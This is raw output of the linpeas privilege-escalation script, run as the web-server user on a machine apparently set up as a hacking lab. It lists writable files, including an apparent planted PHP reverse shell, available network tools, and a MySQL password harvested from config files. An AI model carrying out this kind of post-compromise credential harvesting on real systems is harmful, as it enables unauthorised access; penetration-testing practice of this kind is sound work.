[+] Can I read shadow files? ........... No                                                                                                                    
[+] Can I read root folder? ........... No                                                                                                                     
                                                                                                                                                               
[+] Looking for root files in home dirs (limit 20)
/home                                                                                                                                                          

[+] Looking for root files in folders owned by me
                                                                                                                                                               
[+] Readable files belonging to root and readable by me but not world readable
                                                                                                                                                               
[+] Files inside /home/www-data (limit 20)
                                                                                                                                                               
[+] Files inside others home (limit 20)
/home/grimmie/.bash_history                                                                                                                                    
/home/grimmie/.bashrc
/home/grimmie/backup.sh
/home/grimmie/.profile
/home/grimmie/.bash_logout

[+] Looking for installed mail applications
                                                                                                                                                               
[+] Mails (limit 50)
                                                                                                                                                               
[+] Backup files?
-rwxr-xr-- 1 grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh                                                                                    
-rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup

[+] Looking for tables inside readable .db/.sqlite files (limit 100)
                                                                                                                                                               
[+] Web files?(output limit)
/var/www/:                                                                                                                                                     
total 12K
drwxr-xr-x  3 root root 4.0K May 29  2021 .
drwxr-xr-x 12 root root 4.0K May 29  2021 ..
drwxr-xr-x  3 root root 4.0K May 29  2021 html

/var/www/html:
total 24K
drwxr-xr-x 3 root     root     4.0K May 29  2021 .
drwxr-xr-x 3 root     root     4.0K May 29  2021 ..

[+] *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .gitconfig, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml                                                                                                                                                   
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                            
-rw-r--r-- 1 root root 1994 Apr 18  2019 /etc/bash.bashrc                                                                                                      
-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile
-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 /home/grimmie/.bashrc
-rw-r--r-- 1 grimmie administrator 807 May 29  2021 /home/grimmie/.profile
-rw-r--r-- 1 root root 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
   139266      4 -rw-r--r--   1 grimmie  administrator      220 May 29  2021 /home/grimmie/.bash_logout                                                        
   270249      4 -rw-r--r--   1 root     root               240 Oct 15  2020 /usr/share/phpmyadmin/vendor/paragonie/constant_time_encoding/.travis.yml
   270133      4 -rw-r--r--   1 root     root               250 Oct 15  2020 /usr/share/phpmyadmin/vendor/bacon/bacon-qr-code/.travis.yml
   389530      4 -rw-r--r--   1 root     root               946 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.scrutinizer.yml
   389531      4 -rw-r--r--   1 root     root               706 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.travis.yml
   140294      4 -rw-r--r--   1 root     root               608 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/extensions/.travis.yml
   140341      4 -rw-r--r--   1 root     root              1004 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.travis.yml
   140340      4 -rw-r--r--   1 root     root               799 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.php_cs.dist
   140339      4 -rw-r--r--   1 root     root               224 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.editorconfig
   270226      4 -rw-r--r--   1 root     root               633 Oct 15  2020 /usr/share/phpmyadmin/vendor/google/recaptcha/.travis.yml
   138381      0 -rw-r--r--   1 root     root                 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch
    12136      0 -rw-r--r--   1 root     root                 0 Jul 29  2023 /run/network/.ifstate.lock
   260079      0 -rw-------   1 root     root                 0 May 29  2021 /etc/.pwd.lock
   259843      4 -rw-r--r--   1 root     root               220 Apr 18  2019 /etc/skel/.bash_logout

[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 100)
-rwxrwxrwx 1 www-data www-data 134167 Jul 29 06:32 /tmp/linpeas.sh                                                                                             
-rw-r--r-- 1 root root 11996 May 29  2021 /var/backups/apt.extended_states.0

[+] Interesting writable Files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                 
/dev/mqueue                                                                                                                                                    
/dev/mqueue/linpeas.txt
/dev/shm
/run/lock
/run/lock/apache2
/sys/kernel/security/apparmor/.access
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/tmp
/tmp/linpeas.sh
/var/cache/apache2/mod_cache_disk
/var/lib/php/sessions
/var/lib/phpmyadmin
/var/lib/phpmyadmin/tmp
/var/lib/phpmyadmin/tmp/twig
/var/lib/phpmyadmin/tmp/twig/15
/var/lib/phpmyadmin/tmp/twig/15/15a885ca9738e5a84084a3e52f1f6b23c771ea4f7bdca01081f7b87d3b86a6f9.php
/var/lib/phpmyadmin/tmp/twig/21
/var/lib/phpmyadmin/tmp/twig/21/21a3bee2bc40466295b888b9fec6fb9d77882a7cf061fd3f3d7194b5d54ab837.php
/var/lib/phpmyadmin/tmp/twig/22
/var/lib/phpmyadmin/tmp/twig/22/22f328e86274b51eb9034592ac106d133734cc8f4fba3637fe76b0a4b958f16d.php
/var/lib/phpmyadmin/tmp/twig/28
/var/lib/phpmyadmin/tmp/twig/28/28bcfd31671cb4e1cff7084a80ef5574315cd27a4f33c530bc9ae8da8934caf6.php
/var/lib/phpmyadmin/tmp/twig/2e
/var/lib/phpmyadmin/tmp/twig/2e/2e6ed961bffa8943f6419f806fe7bfc2232df52e39c5880878e7f34aae869dd9.php
/var/lib/phpmyadmin/tmp/twig/31
/var/lib/phpmyadmin/tmp/twig/31/317c8816ee34910f2c19f0c2bd6f261441aea2562acc0463975f80a4f0ed98a9.php
/var/lib/phpmyadmin/tmp/twig/36
/var/lib/phpmyadmin/tmp/twig/36/360a7a01227c90acf0a097d75488841f91dc2939cebca8ee28845b8abccb62ee.php
/var/lib/phpmyadmin/tmp/twig/3b
/var/lib/phpmyadmin/tmp/twig/3b/3bf8a6b93e8c4961d320a65db6c6f551428da6ae8b8e0c87200629b4ddad332d.php
/var/lib/phpmyadmin/tmp/twig/41
/var/lib/phpmyadmin/tmp/twig/41/4161342482a4d1436d31f5619bbdbd176c50e500207e3f364662f5ba8210fe31.php
/var/lib/phpmyadmin/tmp/twig/42
/var/lib/phpmyadmin/tmp/twig/42/426cadcf834dab31a9c871f8a7c8eafa83f4c66a2297cfefa7aae7a7895fa955.php
/var/lib/phpmyadmin/tmp/twig/43
/var/lib/phpmyadmin/tmp/twig/43/43cb8c5a42f17f780372a6d8b976cafccd1f95b8656d9d9638fca2bb2c0c1ee6.php
/var/lib/phpmyadmin/tmp/twig/4c
/var/lib/phpmyadmin/tmp/twig/4c/4c13e8023eae0535704510f289140d5447e25e2dea14eaef5988afa2ae915cb9.php
/var/lib/phpmyadmin/tmp/twig/4e
/var/lib/phpmyadmin/tmp/twig/4e/4e68050e4aec7ca6cfa1665dd465a55a5d643fca6abb104a310e5145d7310851.php
/var/lib/phpmyadmin/tmp/twig/4e/4e8f70ab052f0a5513536d20f156e0649e1791c083804a629624d2cb1e052f1f.php
/var/lib/phpmyadmin/tmp/twig/4f
/var/lib/phpmyadmin/tmp/twig/4f/4f7c1ace051b6b8cb85528aa8aef0052b72277f654cb4f13f2fc063f8529efe4.php
/var/lib/phpmyadmin/tmp/twig/53
/var/lib/phpmyadmin/tmp/twig/53/53ec6cf1deb6f8f805eb3077b06e6ef3b7805e25082d74c09563f91a11c1dfcd.php
/var/lib/phpmyadmin/tmp/twig/5c
/var/lib/phpmyadmin/tmp/twig/5c/5cf13d5a4ba7434d92bc44defee51a93cfbafa0d7984fcb8cbea606d97fe3e1a.php
/var/lib/phpmyadmin/tmp/twig/61
/var/lib/phpmyadmin/tmp/twig/61/61cf92e037fb131bad1ea24485b8e2ab7f0dd05dbe0bcdec85d8a96c80458223.php
/var/lib/phpmyadmin/tmp/twig/6b
/var/lib/phpmyadmin/tmp/twig/6b/6b8deef855b316d17c87795aebdf5aa33b55fae3e6c453d2a5bab7c4085f85d7.php
/var/lib/phpmyadmin/tmp/twig/6c
/var/lib/phpmyadmin/tmp/twig/6c/6c9a7cd11578d393beebc51daa9a48d35c8b03d3a69fd786c55ceedf71a62d29.php
/var/lib/phpmyadmin/tmp/twig/73
/var/lib/phpmyadmin/tmp/twig/73/73a22388ea06dda0a2e91e156573fc4c47961ae6e35817742bb6901eb91d5478.php
/var/lib/phpmyadmin/tmp/twig/73/73ee99e209023ff62597f3f6e5f027a498c1261e4d35d310b0d0a2664f3c2c0d.php
/var/lib/phpmyadmin/tmp/twig/78
/var/lib/phpmyadmin/tmp/twig/78/786fc5d49e751f699117fbb46b2e5920f5cdae9b5b3e7bb04e39d201b9048164.php
/var/lib/phpmyadmin/tmp/twig/7d
/var/lib/phpmyadmin/tmp/twig/7d/7d8087d41c482579730682151ac3393f13b0506f63d25d3b07db85fcba5cdbeb.php
/var/lib/phpmyadmin/tmp/twig/7f
/var/lib/phpmyadmin/tmp/twig/7f/7f2fea86c14cdbd8cd63e93670d9fef0c3d91595972a398d9aa8d5d919c9aa63.php
/var/lib/phpmyadmin/tmp/twig/8a
/var/lib/phpmyadmin/tmp/twig/8a/8a16ca4dbbd4143d994e5b20d8e1e088f482b5a41bf77d34526b36523fc966d7.php
/var/lib/phpmyadmin/tmp/twig/8b
/var/lib/phpmyadmin/tmp/twig/8b/8b3d6e41c7dc114088cc4febcf99864574a28c46ce39fd02d9577bec9ce900de.php
/var/lib/phpmyadmin/tmp/twig/96
/var/lib/phpmyadmin/tmp/twig/96/96885525f00ce10c76c38335c2cf2e232a709122ae75937b4f2eafcdde7be991.php
/var/lib/phpmyadmin/tmp/twig/97
/var/lib/phpmyadmin/tmp/twig/97/9734627c3841f4edcd6c2b6f193947fc0a7a9a69dd1955f703f4f691af6b45e3.php
/var/lib/phpmyadmin/tmp/twig/99
/var/lib/phpmyadmin/tmp/twig/99/9937763182924ca59c5731a9e6a0d96c77ec0ca5ce3241eec146f7bca0a6a0dc.php
/var/lib/phpmyadmin/tmp/twig/9d
/var/lib/phpmyadmin/tmp/twig/9d/9d254bc0e43f46a8844b012d501626d3acdd42c4a2d2da29c2a5f973f04a04e8.php
/var/lib/phpmyadmin/tmp/twig/9d/9d6c5c59ee895a239eeb5956af299ac0e5eb1a69f8db50be742ff0c61b618944.php
/var/lib/phpmyadmin/tmp/twig/9e
/var/lib/phpmyadmin/tmp/twig/9e/9ed23d78fa40b109fca7524500b40ca83ceec9a3ab64d7c38d780c2acf911588.php
/var/lib/phpmyadmin/tmp/twig/a0
/var/lib/phpmyadmin/tmp/twig/a0/a0c00a54b1bb321f799a5f4507a676b317067ae03b1d45bd13363a544ec066b7.php
/var/lib/phpmyadmin/tmp/twig/a4
/var/lib/phpmyadmin/tmp/twig/a4/a49a944225d69636e60c581e17aaceefffebe40aeb5931afd4aaa3da6a0039b9.php
/var/lib/phpmyadmin/tmp/twig/a7
/var/lib/phpmyadmin/tmp/twig/a7/a7e9ef3e1f57ef5a497ace07803123d1b50decbe0fcb448cc66573db89b48e25.php
/var/lib/phpmyadmin/tmp/twig/ae
/var/lib/phpmyadmin/tmp/twig/ae/ae25b735c0398c0c6a34895cf07f858207e235cf453cadf07a003940bfb9cd05.php
/var/lib/phpmyadmin/tmp/twig/af
/var/lib/phpmyadmin/tmp/twig/af/af668e5234a26d3e85e170b10e3d989c2c0c0679b2e5110d593a80b4f58c6443.php
/var/lib/phpmyadmin/tmp/twig/af/af6dd1f6871b54f086eb95e1abc703a0e92824251df6a715be3d3628d2bd3143.php
/var/lib/phpmyadmin/tmp/twig/af/afa81ff97d2424c5a13db6e43971cb716645566bd8d5c987da242dddf3f79817.php
/var/lib/phpmyadmin/tmp/twig/b6
/var/lib/phpmyadmin/tmp/twig/b6/b6c8adb0e14792534ce716cd3bf1d57bc78d45138e62be7d661d75a5f03edcba.php
/var/lib/phpmyadmin/tmp/twig/c3
/var/lib/phpmyadmin/tmp/twig/c3/c34484a1ece80a38a03398208a02a6c9c564d1fe62351a7d7832d163038d96f4.php
/var/lib/phpmyadmin/tmp/twig/c5
/var/lib/phpmyadmin/tmp/twig/c5/c50d1c67b497a887bc492962a09da599ee6c7283a90f7ea08084a548528db689.php
/var/lib/phpmyadmin/tmp/twig/c7
/var/lib/phpmyadmin/tmp/twig/c7/c70df99bff2eea2f20aba19bbb7b8d5de327cecaedb5dc3d383203f7d3d02ad2.php
/var/lib/phpmyadmin/tmp/twig/ca
/var/lib/phpmyadmin/tmp/twig/ca/ca32544b55a5ebda555ff3c0c89508d6e8e139ef05d8387a14389443c8e0fb49.php
/var/lib/phpmyadmin/tmp/twig/d6
/var/lib/phpmyadmin/tmp/twig/d6/d66c84e71db338af3aae5892c3b61f8d85d8bb63e2040876d5bbb84af484fb41.php
/var/lib/phpmyadmin/tmp/twig/dd
/var/lib/phpmyadmin/tmp/twig/dd/dd1476242f68168118c7ae6fc7223306d6024d66a38b3461e11a72d128eee8c1.php
/var/lib/phpmyadmin/tmp/twig/e8
/var/lib/phpmyadmin/tmp/twig/e8/e8184cd61a18c248ecc7e06a3f33b057e814c3c99a4dd56b7a7da715e1bc2af8.php
/var/lib/phpmyadmin/tmp/twig/e9
/var/lib/phpmyadmin/tmp/twig/e9/e93db45b0ff61ef08308b9a87b60a613c0a93fab9ee661c8271381a01e2fa57a.php
/var/lib/phpmyadmin/tmp/twig/f5
/var/lib/phpmyadmin/tmp/twig/f5/f589c1ad0b7292d669068908a26101f0ae7b5db110ba174ebc5492c80bc08508.php
/var/lib/phpmyadmin/tmp/twig/fa
/var/lib/phpmyadmin/tmp/twig/fa/fa249f377795e48c7d92167e29cef2fc31f50401a0bdbc95ddb51c0aec698b9e.php
/var/tmp
/var/www/html/academy
/var/www/html/academy/admin
/var/www/html/academy/admin/assets
/var/www/html/academy/admin/assets/css
/var/www/html/academy/admin/assets/css/bootstrap.css
/var/www/html/academy/admin/assets/css/font-awesome.css
/var/www/html/academy/admin/assets/css/style.css
/var/www/html/academy/admin/assets/fonts
/var/www/html/academy/admin/assets/fonts/FontAwesome.otf
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.eot
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.svg
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.ttf
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.eot
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.svg
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.ttf
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff2
/var/www/html/academy/admin/assets/img
/var/www/html/academy/admin/assets/js
/var/www/html/academy/admin/assets/js/bootstrap.js
/var/www/html/academy/admin/assets/js/jquery-1.11.1.js
/var/www/html/academy/admin/change-password.php
/var/www/html/academy/admin/check_availability.php
/var/www/html/academy/admin/course.php
/var/www/html/academy/admin/department.php
/var/www/html/academy/admin/edit-course.php
/var/www/html/academy/admin/enroll-history.php
/var/www/html/academy/admin/includes
/var/www/html/academy/admin/includes/config.php
/var/www/html/academy/admin/includes/footer.php
/var/www/html/academy/admin/includes/header.php
/var/www/html/academy/admin/includes/menubar.php
/var/www/html/academy/admin/index.php
/var/www/html/academy/admin/level.php
/var/www/html/academy/admin/logout.php
/var/www/html/academy/admin/manage-students.php
/var/www/html/academy/admin/print.php
/var/www/html/academy/admin/semester.php
/var/www/html/academy/admin/session.php
/var/www/html/academy/admin/student-registration.php
/var/www/html/academy/admin/user-log.php
/var/www/html/academy/assets
/var/www/html/academy/assets/css
/var/www/html/academy/assets/css/bootstrap.css
/var/www/html/academy/assets/css/font-awesome.css
/var/www/html/academy/assets/css/style.css
/var/www/html/academy/assets/fonts
/var/www/html/academy/assets/fonts/FontAwesome.otf
/var/www/html/academy/assets/fonts/fontawesome-webfont.eot
/var/www/html/academy/assets/fonts/fontawesome-webfont.svg
/var/www/html/academy/assets/fonts/fontawesome-webfont.ttf
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.eot
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.svg
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.ttf
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff2
/var/www/html/academy/assets/img
/var/www/html/academy/assets/js
/var/www/html/academy/assets/js/bootstrap.js
/var/www/html/academy/assets/js/jquery-1.11.1.js
/var/www/html/academy/change-password.php
/var/www/html/academy/check_availability.php
/var/www/html/academy/db
/var/www/html/academy/db/onlinecourse.sql
/var/www/html/academy/enroll-history.php
/var/www/html/academy/enroll.php
/var/www/html/academy/includes
/var/www/html/academy/includes/config.php
/var/www/html/academy/includes/footer.php
/var/www/html/academy/includes/header.php
/var/www/html/academy/includes/menubar.php
/var/www/html/academy/index.php
/var/www/html/academy/logout.php
/var/www/html/academy/my-profile.php
/var/www/html/academy/pincode-verification.php
/var/www/html/academy/print.php
/var/www/html/academy/studentphoto
/var/www/html/academy/studentphoto/php-rev.php
/tmp/linpeas.sh
/dev/mqueue/linpeas.txt

[+] Searching passwords in config PHP files
$mysql_password = "My_V3ryS3cur3_P4ss";                                                                                                                        
$mysql_password = "My_V3ryS3cur3_P4ss";

[+] Finding IPs inside logs (limit 100)
     44 /var/log/dpkg.log.1:1.8.2.1                                                                                                                            
     24 /var/log/dpkg.log.1:1.8.2.3
     14 /var/log/dpkg.log.1:1.8.4.3
      9 /var/log/wtmp:192.168.10.31
      7 /var/log/dpkg.log.1:7.43.0.2
      7 /var/log/dpkg.log.1:4.8.6.1
      7 /var/log/dpkg.log.1:1.7.3.2
      7 /var/log/dpkg.log.1:0.5.10.2
      7 /var/log/dpkg.log.1:0.19.8.1
      4 /var/log/installer/status:1.2.3.3
      1 /var/log/lastlog:192.168.10.31

[+] Finding passwords inside logs (limit 100)
/var/log/dpkg.log.1:2021-05-29 17:00:10 install base-passwd:amd64 <none> 3.5.46                                                                                
/var/log/dpkg.log.1:2021-05-29 17:00:10 status half-installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 configure base-passwd:amd64 3.5.46 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 upgrade base-passwd:amd64 3.5.46 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:21 install passwd:amd64 <none> 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:21 status half-installed passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:21 status unpacked passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:24 configure base-passwd:amd64 3.5.46 <none>
/var/log/dpkg.log.1:2021-05-29 17:00:24 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:24 status installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:24 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:25 configure passwd:amd64 1:4.5-1.1 <none>
/var/log/dpkg.log.1:2021-05-29 17:00:25 status half-configured passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:25 status installed passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:25 status unpacked passwd:amd64 1:4.5-1.1
/var/log/installer/status:Description: Set up users and passwords

[+] Finding emails inside logs (limit 100)
      1 /var/log/installer/status:aeb@debian.org                                                                                                               
      1 /var/log/installer/status:anibal@debian.org
      2 /var/log/installer/status:berni@debian.org
     40 /var/log/installer/status:debian-boot@lists.debian.org
     16 /var/log/installer/status:debian-kernel@lists.debian.org
      1 /var/log/installer/status:debian-med-packaging@lists.alioth.debian.org
      1 /var/log/installer/status:debian@jff.email
      1 /var/log/installer/status:djpig@debian.org
      4 /var/log/installer/status:gcs@debian.org
      2 /var/log/installer/status:guillem@debian.org
      1 /var/log/installer/status:guus@debian.org
      1 /var/log/installer/status:linux-xfs@vger.kernel.org
      2 /var/log/installer/status:mmind@debian.org
      1 /var/log/installer/status:open-iscsi@packages.debian.org
      1 /var/log/installer/status:open-isns@packages.debian.org
      1 /var/log/installer/status:packages@release.debian.org
      2 /var/log/installer/status:parted-maintainers@alioth-lists.debian.net
      1 /var/log/installer/status:petere@debian.org
      2 /var/log/installer/status:pkg-gnupg-maint@lists.alioth.debian.org
      1 /var/log/installer/status:pkg-gnutls-maint@lists.alioth.debian.org
      1 /var/log/installer/status:pkg-grub-devel@alioth-lists.debian.net
      1 /var/log/installer/status:pkg-mdadm-devel@lists.alioth.debian.org
      1 /var/log/installer/status:rogershimizu@gmail.com
      2 /var/log/installer/status:team+lvm@tracker.debian.org
      1 /var/log/installer/status:tytso@mit.edu
      1 /var/log/installer/status:wpa@packages.debian.org
      1 /var/log/installer/status:xnox@debian.org

[+] Finding *password* or *credential* files in home
                                                                                                                                                               
[+] Finding 'pwd' or 'passw' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2                                                                                             
/var/www/html/academy/admin/assets/js/jquery-1.11.1.js
/var/www/html/academy/admin/change-password.php
/var/www/html/academy/admin/includes/config.php
/var/www/html/academy/admin/index.php
/var/www/html/academy/admin/manage-students.php
/var/www/html/academy/admin/student-registration.php
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/assets/js/jquery-1.11.1.js
/var/www/html/academy/change-password.php
/var/www/html/academy/db/onlinecourse.sql
/var/www/html/academy/includes/config.php
/var/www/html/academy/includes/menubar.php
/var/www/html/academy/index.php
/var/www/html/academy/pincode-verification.php
/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
/etc/apache2/sites-available/default-ssl.conf:          #        Note that no password is obtained from the user. Every entry in the user
/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'.
/etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries
/etc/debconf.conf:Accept-Type: password
/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
/etc/debconf.conf:Name: passwords
/etc/debconf.conf:Reject-Type: password
/etc/debconf.conf:Stack: config, passwords
 linpeas v2.2.7 by carlospolop
                                                                                                                                                               
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEYEND:                                                                                                                                                       
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangenta: Your username


====================================( Basic information )=====================================
OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                  
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: academy
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (You can use linpeas to discover hosts, learn more with -h)
[+] /usr/bin/nc is available for network discover & port scanning (You can use linpeas to discover hosts/port scanning, learn more with -h)                    
                                                                                                                                                               

====================================( System Information )====================================
[+] Operative system                                                                                                                                           
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                
Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                      
Distributor ID: Debian
Description:    Debian GNU/Linux 10 (buster)
Release:        10
Codename:       buster

[+] Sudo version
sudo Not Found                                                                                                                                                 
                                                                                                                                                               
[+] PATH
[i] Any writable folder in original PATH? (a new completed path will be exported)                                                                              
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                   
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[+] Date
Sat Jul 29 06:37:17 EDT 2023                                                                                                                                   

[+] System stats
Filesystem      Size  Used Avail Use% Mounted on                                                                                                               
/dev/sda1       6.9G  1.9G  4.7G  29% /
udev            479M     0  479M   0% /dev
tmpfs           494M     0  494M   0% /dev/shm
tmpfs            99M  4.3M   95M   5% /run
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           494M     0  494M   0% /sys/fs/cgroup
tmpfs            99M     0   99M   0% /run/user/0
              total        used        free      shared  buff/cache   available
Mem:        1009960      178916      474532       10816      356512      640884
Swap:        998396           0      998396

[+] Environment
[i] Any private information inside environment variables?                                                                                                      
HISTFILESIZE=0                                                                                                                                                 
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:13967
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
INVOCATION_ID=d29a7dcbdfb3443ebe10d76ee30417d9
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
HISTFILE=/dev/null

[+] Looking for Signature verification failed in dmseg
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] selinux enabled? .......... sestatus Not Found
[+] Printer? .......... lpstat Not Found                                                                                                                       
[+] Is this a container? .......... No                                                                                                                         
[+] Is ASLR enabled? .......... Yes                                                                                                                            

=========================================( Devices )==========================================
[+] Any sd* disk in /dev? (limit 20)                                                                                                                           
sda                                                                                                                                                            
sda1
sda2
sda5

[+] Unmounted file-system?
[i] Check if you can mount umounted devices                                                                                                                    
UUID=24d0cea7-c37b-4fd6-838e-d05cfb61a601 /               ext4    errors=remount-ro 0       1                                                                  
UUID=930c51cc-089d-42bd-8e30-f08b86c52dca none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0


====================================( Available Software )====================================
[+] Useful software?                                                                                                                                           
/usr/bin/nc                                                                                                                                                    
/usr/bin/netcat
/usr/bin/nc.traditional
/usr/bin/wget
/usr/bin/ping
/usr/bin/base64
/usr/bin/socat
/usr/bin/python
/usr/bin/python2
/usr/bin/python3
/usr/bin/python2.7
/usr/bin/python3.7
/usr/bin/perl
/usr/bin/php

[+] Installed compilers?
Compilers Not Found                                                                                                                                            
                                                                                                                                                               

================================( Processes, Cron & Services )================================
[+] Cleaned processes                                                                                                                                          
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                       
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                       
root         1  0.0  0.9 103796  9972 ?        Ss   05:18   0:01 /sbin/init
root       324  0.0  0.7  40376  7976 ?        Ss   05:18   0:00 /lib/systemd/systemd-journald
root       349  0.0  0.4  21932  4952 ?        Ss   05:18   0:00 /lib/systemd/systemd-udevd
systemd+   434  0.0  0.6  93084  6556 ?        Ssl  05:18   0:00 /lib/systemd/systemd-timesyncd
root       465  0.0  0.2   8504  2736 ?        Ss   05:18   0:00 /usr/sbin/cron -f
root       470  0.0  0.7  19492  7244 ?        Ss   05:18   0:00 /lib/systemd/systemd-logind
message+   472  0.0  0.4   8980  4348 ?        Ss   05:18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       473  0.0  0.4 225824  4332 ?        Ssl  05:18   0:00 /usr/sbin/rsyslogd -n -iNONE
root       475  0.0  0.2   6620  2808 ?        Ss   05:18   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       477  0.0  0.3   6924  3376 tty1     Ss   05:18   0:00 /bin/login -p --
root       486  0.0  0.6  15852  6876 ?        Ss   05:18   0:00 /usr/sbin/sshd -D
root       521  0.0  2.2 214992 23008 ?        Ss   05:18   0:00 /usr/sbin/apache2 -k start
mysql      541  0.0  8.9 1274452 90652 ?       Ssl  05:18   0:03 /usr/sbin/mysqld
www-data   544  0.0  1.2 215348 13032 ?        S    05:18   0:00 /usr/sbin/apache2 -k start
root       634  0.0  0.8  21024  8488 ?        Ss   05:18   0:00 /lib/systemd/systemd --user
root       635  0.0  0.2  22832  2264 ?        S    05:18   0:00 (sd-pam)
root       639  0.0  0.4   7652  4444 tty1     S+   05:18   0:00 -bash
